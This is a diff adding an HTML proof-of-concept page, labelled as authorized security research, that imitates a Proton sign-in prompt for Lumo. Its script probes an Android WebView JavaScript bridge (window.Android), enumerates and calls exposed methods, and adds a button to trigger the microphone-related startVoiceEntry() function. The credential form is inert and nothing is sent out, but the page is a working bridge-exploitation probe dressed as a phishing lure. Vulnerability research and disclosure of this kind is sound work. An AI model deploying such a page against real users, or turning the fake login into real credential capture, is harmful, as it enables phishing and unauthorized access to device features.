@@ -1,0 +1,62 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Proton — Sign in</title>
+<style>
+  body{font-family:-apple-system,system-ui,sans-serif;background:#f7f3ea;color:#1b1340;margin:0;padding:24px}
+  .card{max-width:420px;margin:40px auto;background:#fff;border-radius:16px;padding:28px;box-shadow:0 4px 24px rgba(0,0,0,.12)}
+  .logo{font-weight:800;font-size:22px;color:#6d4aff;margin-bottom:4px}
+  h1{font-size:18px;margin:0 0 4px}
+  p.sub{color:#666;font-size:13px;margin:0 0 20px}
+  input{width:100%;box-sizing:border-box;padding:12px;border:1px solid #ccc;border-radius:8px;margin-bottom:12px;font-size:15px}
+  button{width:100%;padding:13px;background:#6d4aff;color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
+  #probe{margin-top:18px;font-size:12px;color:#0a7d34;word-break:break-all;background:#eefbe9;border:1px solid #b9e8c5;border-radius:8px;padding:10px}
+  #voice{margin-top:10px}
+  .warn{font-size:11px;color:#888;margin-top:14px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">proton</div>
+  <h1>Session expired</h1>
+  <p class="sub">Sign in to Proton to continue to Lumo.</p>
+  <input id="email" placeholder="Email or username" autocomplete="off">
+  <input id="pw" type="password" placeholder="Password">
+  <button onclick="document.getElementById('probe').textContent='Credentials sent (PoC — nothing transmitted)';return false">Sign in</button>
+  <div id="probe">checking bridge…</div>
+  <div id="voice"></div>
+  <p class="warn">PoC page for authorized security research. FIND-001.</p>
+</div>
+<script>
+(function(){
+  var out = {href: location.href, android: null, methods: [], calls: {}};
+  try {
+    if (window.Android) {
+      out.android = typeof window.Android;
+      for (var k in window.Android) { out.methods.push(k); }
+      // Prove the bridge is callable: log() writes to device logcat.
+      try { window.Android.log('FIND001-BRIDGE-PROOF url=' + location.href); out.calls.log = 'ok'; }
+      catch(e){ out.calls.log = 'err:' + e; }
+      out.calls.startVoiceEntry = typeof window.Android.startVoiceEntry;
+      out.calls.showPayment = typeof window.Android.showPayment;
+      out.calls.retryLoad = typeof window.Android.retryLoad;
+    } else {
+      out.android = 'ABSENT';
+    }
+  } catch(e) { out.err = String(e); }
+  document.getElementById('probe').textContent =
+    'window.Android=' + out.android + ' methods=[' + out.methods.join(',') + '] calls=' + JSON.stringify(out.calls);
+  // Optional manual trigger for the mic-permission primitive (needs a tap).
+  if (window.Android && typeof window.Android.startVoiceEntry === 'function') {
+    var b = document.createElement('button');
+    b.textContent = 'Invoke Android.startVoiceEntry()';
+    b.style.marginTop = '10px'; b.style.background = '#b8860b';
+    b.onclick = function(){ try { window.Android.startVoiceEntry(); document.getElementById('voice').textContent='startVoiceEntry() invoked'; } catch(e){ document.getElementById('voice').textContent='err '+e; } };
+    document.getElementById('voice').appendChild(b);
+  }
+})();
+</script>
+</body>
+</html>
